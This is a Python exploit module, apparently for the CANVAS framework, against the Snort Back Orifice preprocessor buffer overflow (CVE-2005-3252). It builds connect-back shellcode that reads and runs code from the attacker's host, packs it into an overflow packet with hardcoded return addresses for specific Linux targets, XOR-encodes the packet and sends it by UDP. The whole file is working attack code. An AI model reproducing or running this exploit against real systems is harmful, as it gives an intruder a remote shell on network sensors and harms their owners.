#! /usr/bin/env python

# IMPORTANT NOTE - IMPORTANT NOTE - IMPORTANT NOTE - IMPORTANT NOTE - IMPORTANT NOTE

# when compiled for debugging, i will be above buf, but when NOT compiled for debugging
# depending on the compiler, i can be placed BELOW buf, so for REAL binaries you have to
# roundrobin through the 2nd buffer, cuz you can't avoid nul's
#
# If you want to play with a DEBUG COMPILED snort, see stinkypoo_debug.py...

# IMPORTANT NOTE - IMPORTANT NOTE - IMPORTANT NOTE - IMPORTANT NOTE - IMPORTANT NOTE

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

import os
import getopt
import socket
import sys
import struct
import time
import select

from exploitutils import *
from tcpexploit import *
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import addencoder
import canvasengine
import shellcodeGenerator

import linuxshell
from libs.ctelnetlib import Telnet

# GUI info
NAME="Stinky"
DESCRIPTION="Snort <= 2.4.2 BO pp exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="SourceFire"
DOCUMENTATION["Date public"] = "2005/10/18"
#DOCUMENTATION["OSVDB"] = ""
DOCUMENTATION["References"] = "http://xforce.iss.net/xforce/alerts/id/207"
DOCUMENTATION["Repeatability"] = "Single shot"
DOCUMENTATION["CVE Name"] = "CVE-2005-3252"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3252"
DOCUMENTATION['CVSS'] = 7.5

VERSION="0.1"


PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386", "_sparc"], ["_Solaris"], ["_FreeBSD"] ]

GTK2_DIALOG = "dialog.glade2"

NOTES="""

# example reordering on suse93 gcc 3.3.5 (NO DEBUG COMPILE):

&buf1 bfffe6a0
&buf2 bfffe2a0
&len bfffe29c
&id bfffe298
&l bfffe294
&i bfffe290
&type bfffe28f
&buf_ptr bfffe288
&plaintext bfffe287

So in this _real_ case, you're _not_ hitting 'i' or 'len', and can just do a straight overflow
"""

targets = {
    # name, retwrites, retaddr, align, bufpad
    0 : ["Autoversioning N/A", 0, 0, 0, 0 ], 
    1 : ["Snort 2.4.2 / gcc 3.3.5 (suse93)", 12, 0xbfffe780L, 0, 0],
    2 : ["Snort 2.4.2 (Redhat 8)", 12, 0xbfffec34L, 0, 0],
    3 : ["Debug crash on 0x41424344", 12, 0x41424344L, 0, 0]
} 

class theexploit(tcpexploit):

    def __init__(self):
        tcpexploit.__init__(self)
        self.holdrand = 0
        self.shellcode = "\xcc"
        self.port=1234
        self.name=NAME

    def createShellcode(self):
        localhost = self.callback.ip
        localport = self.callback.port
        myshellcode = shellcodeGenerator.linux_X86()
        myshellcode.addAttr("connect", {"ipaddress":localhost, "port":localport})
        myshellcode.addAttr("read_and_exec", {"fdreg": "esi"})
        shellcode = myshellcode.get()
        badstring = "\x00"
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.shellcode = encoder.encode(shellcode)
        if self.shellcode == "":
            raise Exception, "error encoding shellcode"
        self.log("Shellcode length: %d"%len(self.shellcode))
        return self.shellcode

    def neededListenerTypes(self):
        return [canvasengine.LINUXMOSDEF]

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i+=1

    def initUdpSock(self):
        self.udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return

    def boRand(self):
        self.holdrand = self.holdrand * 214013L + 2531011L
        return (self.holdrand >> 16) & 0x7fff

    def run(self):

        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))

        self.setInfo("%s attacking Snort via traffic to %s:%d"%(NAME, self.host, self.port), showlog=1)

        # data - some trickyness involved, see notes
        name, retwrites, retaddr, align, bufpad = targets[self.version]

        boping = ""
        # magic cookie
        boping += "\x2A\x21\x2A\x51\x57\x54\x59\x3F"
        # len
        length = 2048 + 1 + align + retwrites * 4 + 2
        import struct
        boping += struct.pack("<L", length)
        # id
        boping += "ABCD"
        # type
        boping += "\x01"

        # ok now we want to make it switch to buf2
        boping += "\x00"          

        # going to buf2
        boping += "A"*1024
        # writing back into buf1 above buf2 (in our special 3.3.5 version)
        boping += "A"*(1024 - (len(self.shellcode) + 256)) + self.shellcode + "A" * 256

        # ALIGN
        if align:
            boping += "A"*align
        # ret overwrites
        boping += struct.pack("<L", retaddr) * retwrites

        # so we don't get our last byte f-ed with
        boping += 2*"A"

        # crc
        boping += "A"

        # XOR encode it
        stinkypoo = ""
        for c in boping:
            randm = self.boRand() % 256
            xored = ord(c)^randm
            #print "\\x%.2x (randm: %.2x)"%(xored,randm),
            stinkypoo += chr(xored)

        self.log("Slinging stinky poo...")

        self.initUdpSock()
        self.udpsock.sendto(stinkypoo, (self.host, self.port)) 

        if self.ISucceeded():
            self.setInfo("%s Attacking Snort via traffic to %s:%d (success!)"%(NAME, self.host, self.port), showlog=1)
        else:
            self.setInfo("%s Attacking Snort via traffic to %s:%d (failed?)"%(NAME, self.host, self.port), showlog=1)

        return

if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)

